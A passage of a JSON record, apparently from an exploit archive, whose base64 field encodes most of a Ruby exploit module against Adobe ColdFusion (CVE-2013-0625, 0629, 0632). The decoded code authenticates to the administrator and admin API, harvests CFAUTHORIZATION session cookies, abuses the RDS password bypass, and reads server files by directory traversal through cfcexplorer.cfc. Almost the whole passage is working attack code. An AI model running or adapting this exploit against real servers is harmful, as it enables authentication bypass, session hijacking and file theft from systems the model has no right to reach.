KHRhcmdldF91cmkucGF0aCwgc2NoZWR1bGV0YXNrc19wYXRoKSArICI/YWN0aW9uPWRlbGV0ZSZ0YXNrPSN7dGFza19pZH0mY3NyZnRva2VuPSN7dG9rZW59IiwNCiAgICAgICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICAgICAnY29ubmVjdGlvbicgPT4gJ1RFLCBjbG9zZScsDQogICAgICAgICAgJ2Nvb2tpZScgPT4gYnVpbGRfY29va2llX2hlYWRlcihjb29raWVfaGFzaCksDQogICAgICAgIH0pDQogICAgZW5kDQoNCiAgICB2cHJpbnRfc3RhdHVzIG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaSwgcHVibGlzaF9maWxlKQ0KICAgIHB1Ymxpc2hfZmlsZQ0KICBlbmQNCg0KICAjIEdpdmVuIHRoZSBIVFRQIHJlc3BvbnNlICtyZXMrLCBleHRyYWN0IGFueSBpbnRlcmVzdGluZywgbm9uLWVtcHR5DQogICMgY29va2llcywgcmV0dXJuaW5nIHRoZW0gYXMgYSBoYXNoDQogIGRlZiBnZXRfdXNlZnVsX2Nvb2tpZXMgcmVzDQogICAgc2V0X2Nvb2tpZSA9IHJlcy5oZWFkZXJzWydTZXQtQ29va2llJ10NCiAgICAjIFBhcnNlIHRoZSBTZXQtQ29va2llIGhlYWRlcg0KICAgIHBhcnNlZF9jb29raWVzID0gQ0dJOjpDb29raWUucGFyc2Uoc2V0X2Nvb2tpZSkNCg0KICAgICMgQ2xlYW4gdXAgdGhlIGNvb2tpZXMgd2UgZ290IGJ5Og0KICAgICMgICAqIERyb3BwaW5nIFBhdGggYW5kIEV4cGlyZXMgZnJvbSB0aGUgcGFyc2VkIGNvb2tpZXMgLS0gd2UgZG9uJ3QgY2FyZQ0KICAgICMgICAqIERyb3BwaW5nIGVtcHR5IChyZXNldCkgY29va2llcw0KICAgICV3KFBhdGggRXhwaXJlcykuZWFjaCBkbyB8aWdub3JlfA0KICAgICAgcGFyc2VkX2Nvb2tpZXMuZGVsZXRlIGlnbm9yZQ0KICAgICAgcGFyc2VkX2Nvb2tpZXMuZGVsZXRlIGlnbm9yZS5kb3duY2FzZQ0KICAgIGVuZA0KICAgIHBhcnNlZF9jb29raWVzLmtleXMuZWFjaCBkbyB8bmFtZXwNCiAgICAgIHBhcnNlZF9jb29raWVzW25hbWVdLnJlamVjdCEgeyB8dmFsdWV8IHZhbHVlID09ICciIicgfQ0KICAgIGVuZA0KICAgIHBhcnNlZF9jb29raWVzLnJlamVjdCEgeyB8bmFtZSx2YWx1ZXN8IHZhbHVlcy5lbXB0eT8gfQ0KDQogICAgIyB0aGUgY29va2llcyBhbHdheXMgc2VlbSB0byBzdGFydCB3aXRoIENGQVVUSE9SSVpBVElPTl8sIGJ1dA0KICAgICMgZ2l2ZSB0aGUgbW9kdWxlIHRoZSBhYmlsaXR5IHRvIGxvZyB3aGF0IGl0IGdvdCBpbiB0aGUgZXZlbnQNCiAgICAjIHRoYXQgdGhpcyBzdG9wcyBiZWNvbWluZyBhbiBPSyBhc3N1bXB0aW9uDQogICAgdW5sZXNzIHBhcnNlZF9jb29raWVzLmVtcHR5Pw0KICAgICAgdnByaW50X3N0YXR1cyAiR290IHRoZSBmb2xsb3dpbmcgY29va2llcyBhZnRlciBhdXRoZW50aWNhdGluZzogI3twYXJzZWRfY29va2llc30iDQogICAgZW5kDQogICAgY29va2llX3BhdHRlcm4gPSAvXkNGLw0KICAgIHVzZWZ1bF9jb29raWVzID0gcGFyc2VkX2Nvb2tpZXMuc2VsZWN0IHsgfG5hbWUsdmFsdWV8IG5hbWUgPX4gY29va2llX3BhdHRlcm4gfQ0KICAgIGlmIHVzZWZ1bF9jb29raWVzLmVtcHR5Pw0KICAgICAgdnByaW50X3N0YXR1cyAiTm8gI3tjb29raWVfcGF0dGVybn0gY29va2llcyBmb3VuZCINCiAgICBlbHNlDQogICAgICB2cHJpbnRfc3RhdHVzICJUaGUgZm9sbG93aW5nIGNvb2tpZXMgY291bGQgYmUgdXNlZCBmb3IgZnV0dXJlIGF1dGhlbnRpY2F0aW9uOiAje3VzZWZ1bF9jb29raWVzfSINCiAgICBlbmQNCiAgICB1c2VmdWxfY29va2llcw0KICBlbmQNCg0KICAjIEF1dGhlbnRpY2F0ZXMgdG8gQ29sZEZ1c2lvbiBBZG1pbmlzdHJhdG9yIHZpYSB0aGUgYWRtaW5hcGkgdXNpbmcgdGhlDQogICMgc3BlY2lmaWVkICt1c2VyKyBhbmQgK3Bhc3N3b3JkKy4gIElmICt1c2VfcmRzKyBpcyB0cnVlLCBpdCBpcyBhc3N1bWVkIHRoYXQNCiAgIyB0aGUgcHJvdmlkZWQgY3JlZGVudGlhbHMgYXJlIGZvciBSRFMsIG90aGVyd2lzZSB0aGV5IGFyZSBhc3N1bWVkIHRvIGJlDQogICMgY3JlZGVudGlhbHMgZm9yIENvbGRGdXNpb24gQWRtaW5pc3RyYXRvci4NCiAgIw0KICAjIFJldHVybnMgYSBoYXNoIChjb29raWUgbmFtZSA9PiB2YWx1ZSkgb2YgdGhlIGNvb2tpZXMgb2J0YWluZWQNCiAgZGVmIGFkbWluYXBpX2xvZ2luIHVzZXIsIHBhc3N3b3JkLCB1c2VfcmRzDQogICAgdnByaW50X3N0YXR1cyAiQXR0ZW1wdGluZyBDb2xkRnVzaW9uIEFkbWluaXN0cmF0b3IgYWRtaW5hcGkgbG9naW4iDQogICAgdXNlciB8fD0gJycNCiAgICBwYXNzd29yZCB8fD0gJycNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgew0KICAgICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJXcoQ0ZJREUgYWRtaW5hcGkgYWRtaW5pc3RyYXRvci5jZmMpKSwNCiAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgICAnY29ubmVjdGlvbicgPT4gJ1RFLCBjbG9zZScsDQogICAgICAgICd2YXJzX3Bvc3QnID0+IHsNCiAgICAgICAgICAnbWV0aG9kJyA9PiAnbG9naW4nLA0KICAgICAgICAgICdhZG1pblVzZXJJZCcgPT4gdXNlciwNCiAgICAgICAgICAnYWRtaW5QYXNzd29yZCcgPT4gcGFzc3dvcmQsDQogICAgICAgICAgJ3Jkc1Bhc3N3b3JkQWxsb3dlZCcgPT4gKHVzZV9yZHMgPyAnMScgOiAnMCcpDQogICAgICAgIH0NCiAgICAgIH0pDQoNCiAgICBpZiByZXMNCiAgICAgIGlmIHJlcy5jb2RlID09IDIwMA0KICAgICAgICB2cHJpbnRfc3RhdHVzICJIVFRQICN7cmVzLmNvZGV9IHdoZW4gYXV0aGVudGljYXRpbmciDQogICAgICAgIHJldHVybiBnZXRfdXNlZnVsX2Nvb2tpZXMocmVzKQ0KICAgICAgZWxzZQ0KICAgICAgICBwcmludF9lcnJvciAiSFRUUCAje3Jlcy5jb2RlfSB3aGVuIGF1dGhlbnRpY2F0aW5nIg0KICAgICAgZW5kDQogICAgZWxzZQ0KICAgICAgcHJpbnRfZXJyb3IgIk5vIHJlc3BvbnNlIHdoZW4gYXV0aGVudGljYXRpbmciDQogICAgZW5kDQoNCiAgICB7fQ0KICBlbmQNCg0KICAjIEF1dGhlbnRpY2F0ZXMgdG8gQ29sZEZ1c2lvbiBBZG1pbmlzdHJhdG9yIHVzaW5nIHRoZSBzcGVjaWZpZWQgK3VzZXIrIGFuZA0KICAjICtwYXNzd29yZCsNCiAgIw0KICAjIFJldHVybnMgYSBoYXNoIChjb29raWUgbmFtZSA9PiB2YWx1ZSkgb2YgdGhlIGNvb2tpZXMgb2J0YWluZWQNCiAgZGVmIGFkbWluaXN0cmF0b3JfbG9naW4gdXNlciwgcGFzc3dvcmQNCiAgICBjZl9jb29raWVzID0gYWRtaW5pc3RyYXRvcl85eF9sb2dpbiB1c2VyLCBwYXNzd29yZA0KICAgIHVubGVzcyBnb3RfYXV0aD8gY2ZfY29va2llcw0KICAgICAgY2ZfY29va2llcyA9IGFkbWluaXN0cmF0b3JfMTB4X2xvZ2luIHVzZXIsIHBhc3N3b3JkDQogICAgZW5kDQogICAgY2ZfY29va2llcw0KICBlbmQNCg0KICBkZWYgYWRtaW5pc3RyYXRvcl8xMHhfbG9naW4gdXNlciwgcGFzc3dvcmQNCiAgICAjIGNvbGRmdXNpb24gMTAgYXBwZWFycyB0byBkbzoNCiAgICAjICAgY2ZhZG1pblBhc3N3b3JkLnZhbHVlID0gaGV4X3NoYTEoY2ZhZG1pblBhc3N3b3JkLnZhbHVlKQ0KICAgIHZwcmludF9zdGF0dXMgIlRyeWluZyBDb2xkRnVzaW9uIDEwLnggQWRtaW5pc3RyYXRvciBsb2dpbiINCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgew0KICAgICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJXcoQ0ZJREUgYWRtaW5pc3RyYXRvciBlbnRlci5jZm0pKSwNCiAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgICAndmFyc19wb3N0JyA9PiB7DQogICAgICAgICAgJ2NmYWRtaW5Vc2VySWQnID0+IHVzZXIsDQogICAgICAgICAgJ2NmYWRtaW5QYXNzd29yZCcgPT4gRGlnZXN0OjpTSEExLmhleGRpZ2VzdChwYXNzd29yZCkudXBjYXNlLA0KICAgICAgICAgICdyZXF1ZXN0ZWRVUkwnID0+ICcvQ0ZJREUvYWRtaW5pc3RyYXRvci9pbmRleC5jZm0nLA0KICAgICAgICAnc3VibWl0JyA9PiAnTG9naW4nLA0KICAgICAgICB9DQogICAgICB9KQ0KDQogICAgaWYgcmVzDQogICAgICBpZiByZXMuY29kZS50b19zID1+IC9eMzBbMTJdLw0KICAgICAgICB1c2VmdWxfY29va2llcyA9IGdldF91c2VmdWxfY29va2llcyByZXMNCiAgICAgICAgaWYgZ290X2F1dGg/IHVzZWZ1bF9jb29raWVzDQogICAgICAgICAgcmV0dXJuIHVzZWZ1bF9jb29raWVzDQogICAgICAgIGVuZA0KICAgICAgZWxzZQ0KICAgICAgICBpZiByZXMuYm9keSA9fiAvPHRpdGxlPkVycm9yL2kNCiAgICAgICAgICBwcmludF9zdGF0dXMgIkFwcGVhcnMgdG8gYmUgcmVzdHJpY3RlZCBhbmQvb3Igbm90IENvbGRGdXNpb24gMTAueCINCiAgICAgICAgZWxzaWYgcmVzLmJvZHkgPX4gL0EgTGljZW5zZSBleGNlcHRpb24gaGFzIG9jY3VycmVkL2kNCiAgICAgICAgICBwcmludF9zdGF0dXMgIklzIGxpY2Vuc2UgcmVzdHJpY3RlZCINCiAgICAgICAgZWxzZQ0KICAgICAgICAgIHZwcmludF9zdGF0dXMgIkdvdCB1bmV4cGVjdGVkIEhUVFAgI3tyZXMuY29kZX0gcmVzcG9uc2Ugd2hlbiBzZW5kaW5nIGEgQ29sZEZ1c2lvbiAxMC54IHJlcXVlc3QuICBOb3QgMTAueD8iDQogICAgICAgICAgdnByaW50X3N0YXR1cyByZXMuYm9keQ0KICAgICAgICBlbmQNCiAgICAgIGVuZA0KICAgIGVuZA0KDQogICAgcmV0dXJuIHt9DQogIGVuZA0KDQogIGRlZiBnb3RfYXV0aD8gY29va2llcw0KICAgIG5vdCBjb29raWVzLnNlbGVjdCB7IHxuYW1lLHZhbHVlc3wgbmFtZSA9fiAvXkNGQVVUSE9SSVpBVElPTl8vIH0uZW1wdHk/DQogIGVuZA0KDQogIGRlZiBhZG1pbmlzdHJhdG9yXzl4X2xvZ2luIHVzZXIsIHBhc3N3b3JkDQogICAgdnByaW50X3N0YXR1cyAiVHJ5aW5nIENvbGRGdXNpb24gOS54IEFkbWluaXN0cmF0b3IgbG9naW4iDQogICAgIyBjb2xkZnVzaW9uIDkgYXBwZWFycyB0byBkbzoNCiAgICAjICAgY2ZhZG1pblBhc3N3b3JkLnZhbHVlID0gaGV4X2htYWNfc2hhMShzYWx0LnZhbHVlLCBoZXhfc2hhMShjZmFkbWluUGFzc3dvcmQudmFsdWUpKTsNCiAgICAjDQogICAgIyBZb3UgY2FuIGdldCBhIGN1cnJlbnQgc2FsdCBmcm9tDQogICAgIyAgIGh0dHA6Ly88aG9zdD46ODUwMC9DRklERS9hZG1pbmFwaS9hZG1pbmlzdHJhdG9yLmNmYz9tZXRob2Q9Z2V0U2FsdCZuYW1lPUNGSURFLmFkbWluYXBpLmFkbWluaXN0cmF0b3ImcGF0aD0vQ0ZJREUvYWRtaW5hcGkvYWRtaW5pc3RyYXRvci5jZmMjbWV0aG9kX2dldFNhbHQNCiAgICAjDQogICAgIyBVbmZvcnR1bmF0ZWx5IHRoYXQgVVJMIG1pZ2h0IGJlIHJlc3RyaWN0ZWQgYW5kIHRoZSBzYWx0IHJlYWxseSBqdXN0IGxvb2tzDQogICAgIyB0byBiZSB0aGUgY3VycmVudCB0aW1lIHJlcHJlc2VudGVkIGFzIHRoZSBudW1iZXIgb2YgbWlsbGlzZWNvbmRzIHNpbmNlDQogICAgIyB0aGUgZXBvY2gsIHNvIGp1c3QgdXNlIHRoYXQNCiAgICBzYWx0ID0gKFRpbWUubm93LnRvX2kgKiAxMDAwKS50b19zDQogICAgcGFzcyA9IE9wZW5TU0w6OkhNQUMuaGV4ZGlnZXN0KE9wZW5TU0w6OkRpZ2VzdC5uZXcoJ3NoYTEnKSwgc2FsdCwgRGlnZXN0OjpTSEExLmhleGRpZ2VzdChwYXNzd29yZCkudXBjYXNlKS51cGNhc2UNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgew0KICAgICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJXcoQ0ZJREUgYWRtaW5pc3RyYXRvciBlbnRlci5jZm0pKSwNCiAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgICAndmFyc19wb3N0JyA9PiB7DQogICAgICAgICAgJ3N1Ym1pdCcgPT4gJ0xvZ2luJywNCiAgICAgICAgICAnc2FsdCcgPT4gc2FsdCwNCiAgICAgICAgICAnY2ZhZG1pblVzZXJJZCcgPT4gdXNlciwNCiAgICAgICAgICAncmVxdWVzdGVkVVJMJyA9PiAnL0NGSURFL2FkbWluaXN0cmF0b3IvaW5kZXguY2ZtJywNCiAgICAgICAgICAnY2ZhZG1pblBhc3N3b3JkJyA9PiBwYXNzLA0KICAgICAgICB9DQogICAgICB9KQ0KICAgIGlmIHJlcw0KICAgICAgcmV0dXJuIGdldF91c2VmdWxfY29va2llcyByZXMNCiAgICBlbHNlDQogICAgICBwcmludF9lcnJvciAiTm8gcmVzcG9uc2Ugd2hpbGUgdHJ5aW5nIENvbGRGdXNpb24gOS54IGF1dGhlbnRpY2F0aW9uIg0KICAgIGVuZA0KDQogICAge30NCiAgZW5kDQoNCiAgIyBBdXRoZW50aWNhdGVzIHRvIENvbGRGdXNpb24gQ29tcG9uZW50VXRpbHMgdXNpbmcgdGhlIHNwZWNpZmllZCArdXNlcisgYW5kICtwYXNzd29yZCsNCiAgIw0KICAjIFJldHVybnMgYSBoYXNoIChjb29raWUgbmFtZSA9PiB2YWx1ZSkgb2YgdGhlIGNvb2tpZXMgb2J0YWluZWQNCiAgZGVmIGNvbXBvbmVudHV0aWxzX2xvZ2luIHVzZXIsIHBhc3N3b3JkDQogICAgdnByaW50X3N0YXR1cyAiQXR0ZW1wdGluZyBDb2xkRnVzaW9uIENvbXBvbmVudFV0aWxzIGxvZ2luIg0KICAgIHZhcnMgPSB7DQogICAgICAgICAgJ2pfcGFzc3dvcmRfcmVxdWlyZWQnID0+ICJQYXNzd29yZCtSZXF1aXJlZCIsDQogICAgICAgICAgJ3N1Ym1pdCcgPT4gJ0xvZ2luJywNCiAgICB9DQogICAgdmFyc1sncmRzVXNlcklkJ10gPSB1c2VyIGlmIHVzZXINCiAgICB2YXJzWydqX3Bhc3N3b3JkJ10gPSBwYXNzd29yZCBpZiBwYXNzd29yZA0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICB7DQogICAgICAgICd1cmknICAgID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAldyhDRklERSBjb21wb25lbnR1dGlscyBjZmNleHBsb3Jlci5jZmMpKSwNCiAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgICAnY29ubmVjdGlvbicgPT4gJ1RFLCBjbG9zZScsDQogICAgICAgICd2YXJzX3Bvc3QnID0+IHZhcnMNCiAgICAgIH0pDQoNCiAgICBjZl9jb29raWVzID0ge30NCiAgICBpZiByZXMuY29kZS50b19zID1+IC9eKD86MjAwfDMwWzEyXSkkLw0KICAgICAgY2ZfY29va2llcyA9IGdldF91c2VmdWxfY29va2llcyByZXMNCiAgICBlbHNlDQogICAgICBwcmludF9lcnJvciAiSFRUUCAje3Jlcy5jb2RlfSB3aGlsZSBhdHRlbXB0aW5nIENvbGRGdXNpb24gQ29tcG9uZW50VXRpbHMgbG9naW4iDQogICAgZW5kDQoNCiAgICBjZl9jb29raWVzDQogIGVuZA0KDQogIGRlZiBjaGVja19jdmVfMjAxM18wNjI5DQogICAgdnVsbnMgPSAwDQogICAgcGF0aHMgPSAldyguLi8uLi8uLi9saWNlbnNlLnR4dCAuLi8uLi8uLi8uLi9saWNlbnNlLmh0bWwpDQoNCiAgICAjIGZpcnN0IHRyeSBwYXNzd29yZC1sZXNzIGJ5cGFzcyBpbiB0aGUgZXZlbnQgdGhhdCB0aGlzIHRoaW5nDQogICAgIyB3YXMganVzdCB3aWRlIG9wZW4NCiAgICB2dWxuX3dpdGhvdXRfY3JlZHMgPSBmYWxzZQ0KICAgIHBhdGhzLmVhY2ggZG8gfHBhdGh8DQogICAgICBpZiAodHJhdmVyc2VfcmVhZCBwYXRoLCBuaWwpID1+IC9BRE9CRSBTWVNURU1TIElOQ09SUE9SQVRFRC8NCiAgICAgICAgdnVsbnMgKz0gMQ0KICAgICAgICB2dWxuX3dpdGhvdXRfY3JlZHMgPSB0cnVlDQogICAgICAgIGJyZWFrDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIGlmIHZ1bG5fd2l0aG91dF9jcmVkcw0KICAgICAgcHJpbnRfc3RhdHVzICIje2RhdGFzdG9yZVsnUkhPU1QnXX0gaXMgdnVsbmVyYWJsZSB0byBDVkUtMjAxMy0wNjI5IHdpdGhvdXQgY3JlZGVudGlhbHMiDQogICAgZWxzZQ0KICAgICAgcHJpbnRfc3RhdHVzICIje2RhdGFzdG9yZVsnUkhPU1QnXX0gaXMgbm90IHZ1bG5lcmFibGUgdG8gQ1ZFLTIwMTMtMDYyOSB3aXRob3V0IGNyZWRlbnRpYWxzIg0KICAgIGVuZA0KDQogICAgIyBpZiBjcmVkZW50aWFscyBhcmUgcHJvdmlkZWQsIHRyeSB0aG9zZSB0b28NCiAgICBpZiBkYXRhc3RvcmVbJ1VTRVJOQU1FJ10gYW5kIGRhdGFzdG9yZVsnUEFTU1dPUkQnXQ0KICAgICAgdnVsbl93aXRob3V0X2J5cGFzcyA9IGZhbHNlDQogICAgICBwYXRocy5lYWNoIGRvIHxwYXRofA0KICAgICAgICBjZl9jb29raWVzID0gY29tcG9uZW50dXRpbHNfbG9naW4gZGF0YXN0b3JlWydVU0VSTkFNRSddLCBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10NCiAgICAgICAgaWYgKHRyYXZlcnNlX3JlYWQgcGF0aCwgY2ZfY29va2llcykgPX4gL0FET0JFIFNZU1RFTVMgSU5DT1JQT1JBVEVELw0KICAgICAgICAgIHZ1bG5zICs9IDENCiAgICAgICAgICB2dWxuX3dpdGhvdXRfYnlwYXNzID0gdHJ1ZQ0KICAgICAgICAgIGJyZWFrDQogICAgICAgIGVuZA0KICAgICAgZW5kDQoNCiAgICAgIGlmIHZ1bG5fd2l0aG91dF9ieXBhc3MNCiAgICAgICAgcHJpbnRfc3RhdHVzICIje2RhdGFzdG9yZVsnUkhPU1QnXX0gaXMgdnVsbmVyYWJsZSB0byBDVkUtMjAxMy0wNjI5IHdpdGggY3JlZGVudGlhbHMiDQogICAgICBlbHNlDQogICAgICAgIHByaW50X3N0YXR1cyAiI3tkYXRhc3RvcmVbJ1JIT1NUJ119IGlzIG5vdCB2dWxuZXJhYmxlIHRvIENWRS0yMDEzLTA2Mjkgd2l0aCBjcmVkZW50aWFscyINCiAgICAgIGVuZA0KICAgIGVuZA0KDQogICAgIyBub3cgdHJ5IHdpdGggdGhlIENWRS0yMDEzLTA2MzIgYnlwYXNzLCBpbiB0aGUgZXZlbnQgdGhhdCB0aGlzIHdhc24ndCAqdG90YWxseSogd2lkZSBvcGVuDQogICAgdnVsbl93aXRoX2J5cGFzcyA9IGZhbHNlDQogICAgcGF0aHMuZWFjaCBkbyB8cGF0aHwNCiAgICAgIGNmX2Nvb2tpZXMgPSBhZG1pbmFwaV9sb2dpbiBkYXRhc3RvcmVbJ1VTRVJOQU1FJ10sIGRhdGFzdG9yZVsnUEFTU1dPUkQnXSwgdHJ1ZQ0KICAgICAgIyB3ZSBuZWVkIHRvIHRha2UgdGhlIGNvb2tpZSB2YWx1ZSBmcm9tIENGQVVUSE9SSVpBVElPTl9jZmFkbWluDQogICAgICAjIGFuZCB1c2UgaXQgZm9yIENGQVVUSE9SSVpBVElPTl9jb21wb25lbnR1dGlscw0KICAgICAgY2ZfY29va2llc1snQ0ZBVVRIT1JJWkFUSU9OX2NvbXBvbmVudHV0aWxzJ10gPSBjZl9jb29raWVzWydDRkFVVEhPUklaQVRJT05fY2ZhZG1pbiddDQogICAgICBjZl9jb29raWVzLmRlbGV0ZSAnQ0ZBVVRIT1JJWkFUSU9OX2NmYWRtaW4nDQogICAgICBpZiAodHJhdmVyc2VfcmVhZCBwYXRoLCBjZl9jb29raWVzKSA9fiAvQURPQkUgU1lTVEVNUyBJTkNPUlBPUkFURUQvDQogICAgICAgIHZ1bG5zICs9IDENCiAgICAgICAgdnVsbl93aXRoX2J5cGFzcyA9IHRydWUNCiAgICAgICAgYnJlYWsNCiAgICAgIGVuZA0KICAgIGVuZA0KDQogICAgaWYgdnVsbl93aXRoX2J5cGFzcw0KICAgICAgcHJpbnRfc3RhdHVzICIje2RhdGFzdG9yZVsnUkhPU1QnXX0gaXMgdnVsbmVyYWJsZSB0byBDVkUtMjAxMy0wNjI5IGluIGNvbWJpbmF0aW9uIHdpdGggQ1ZFLTIwMTMtMDYzMiINCiAgICBlbHNlDQogICAgICBwcmludF9zdGF0dXMgIiN7ZGF0YXN0b3JlWydSSE9TVCddfSBpcyBub3QgdnVsbmVyYWJsZSB0byBDVkUtMjAxMy0wNjI5IGluIGNvbWJpbmF0aW9uIHdpdGggQ1ZFLTIwMTMtMDYzMiINCiAgICBlbmQNCg0KICAgIHZ1bG5zID4gMA0KICBlbmQNCg0KICAjIENoZWNrcyBmb3IgQ1ZFLTIwMTMtMDYzMiwgcmV0dXJuaW5nIHRydWUgaWYgdGhlIHRhcmdldCBpcw0KICAjIHZ1bG5lcmFibGUsIGZhbHNlIG90aGVyd2lzZQ0KICBkZWYgY2hlY2tfY3ZlXzIwMTNfMDYzMg0KICAgIGlmIGRhdGFzdG9yZVsnVVNFUkRTJ10NCiAgICAgICMgdGhlIHZ1bG5lcmFiaWxpdHkgZm9yIENWRS0yMDEzLTA2MzIgaXMgdGhhdCBpZiBSRFMgaXMgZGlzYWJsZWQgZHVyaW5nIGluc3RhbGwgYnV0DQogICAgICAjIHN1YnNlcXVlbnRseSAqZW5hYmxlZCogYWZ0ZXIgaW5zdGFsbCwgdGhlIHBhc3N3b3JkIGlzIHVuc2V0IHNvIHdlIHNpbXBseSBtdXN0DQogICAgICAjIGNoZWNrIHRoYXQgYW5kIG9ubHkgdGhhdC4NCiAgICAgIGNmX2Nvb2tpZXMgPSBhZG1pbmFwaV9sb2dpbiAnZm9vJywgJ2JhcicsIHRydWUNCiAgICAgIGlmIGNmX2Nvb2tpZXMuZW1wdHk/DQogICAgICAgIHByaW50X3N0YXR1cyAiI3tkYXRhc3RvcmVbJ1JIT1NUJ119IGlzIG5vdCB2dWxuZXJhYmxlIHRvIENWRS0yMDEzLTA2MzIiDQogICAgICBlbHNlDQogICAgICAgIHByaW50X3N0YXR1cyAiI3tkYXRhc3RvcmVbJ1JIT1NUJ119IGlzIHZ1bG5lcmFibGUgdG8gQ1ZFLTIwMTMtMDYzMiINCiAgICAgICAgcmV0dXJuIHRydWUNCiAgICAgIGVuZA0KICAgIGVsc2UNCiAgICAgIHByaW50X2Vycm9yICJDYW5ub3QgdGVzdCAje2RhdGFzdG9yZVsnUkhPU1QnXX0gQ1ZFLTIwMTMtMDYzMiB3aXRoIFVTRVJEUyBvZmYiDQogICAgZW5kDQogICAgZmFsc2UNCiAgZW5kDQoNCiAgZGVmIHRyYXZlcnNlX3JlYWQgcGF0aCwgY29va2llcw0KICAgIHVyaSA9IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoKQ0KICAgIHVyaSA8PCAiQ0ZJREUvY29tcG9uZW50dXRpbHMvY2ZjZXhwbG9yZXIuY2ZjP21ldGhvZD1nZXRjZmNpbmh0bWwmbmFtZT1DRklERS5hZG1pbmFwaS5hZG1pbmlzdHJhdG9yJnBhdGg9Ig0KICAgIHVyaSA8PCBwYXRoDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgIHsNCiAgICAgICAgJ3VyaScgICAgPT4gdXJpLA0KICAgICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICAgJ2Nvbm5lY3Rpb24nID0+ICdURSwgY2xvc2UnLA0KICAgICAgICAnY29va2llJyA9PiBidWlsZF9jb29raWVfaGVhZGVyKGNvb2tpZXMpDQogICAgICB9KQ0KICAgIHJlcy5ib2R5LmdzdWIoL1xyXG4/LywgIlxuIikuZ3N1YigvLjxodG1sPi48aGVhZD4uPHRpdGxlPkNvbXBvbmVudC4qL20sICcnKQ0KICBlbmQNCmVuZA==", 
    "filename": "platforms/multiple/remote/24946.rb", 
    "id": "24946", 
    "cves": [
        "CVE-2013-0625", 
        "CVE-2013-0632", 
        "CVE-2013-0629"
    ]
}